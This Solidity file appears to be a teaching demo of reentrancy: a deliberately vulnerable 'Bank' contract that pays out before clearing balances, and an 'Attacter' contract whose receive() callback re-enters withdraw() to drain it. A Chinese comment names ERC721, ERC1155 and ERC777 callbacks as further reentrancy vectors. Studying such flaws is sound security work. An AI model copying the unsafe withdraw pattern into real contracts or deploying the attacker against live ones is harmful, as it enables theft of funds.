// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// 实际业务中，ERC721和ERC1155的safeTransfer()和safeTransferFrom()安全转账函数，还有ERC777的回退函数，都可能会引发重入攻击。

contract Bank {

    mapping(address => uint256) balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        // query
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "no money");

        // transfer
        (bool ok,) = msg.sender.call{value: balance}("");
        require(ok, "call failed");

        // update
        balanceOf[msg.sender] = 0;
    }
}

contract Attacter {

    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    receive() external payable {
        if(address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "need 1 ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
